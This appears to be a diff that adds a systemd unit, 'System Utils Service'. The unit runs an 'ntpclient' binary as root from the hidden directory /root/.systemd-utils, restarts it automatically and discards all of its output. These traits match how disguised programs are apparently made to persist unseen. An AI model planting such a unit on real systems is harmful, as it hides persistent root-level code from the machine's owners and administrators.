@@ -1,0 +1,16 @@
+[Unit]
+Description=System Utils Service
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root/.systemd-utils
+ExecStart=/root/.systemd-utils/ntpclient -c /root/.systemd-utils/conf
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
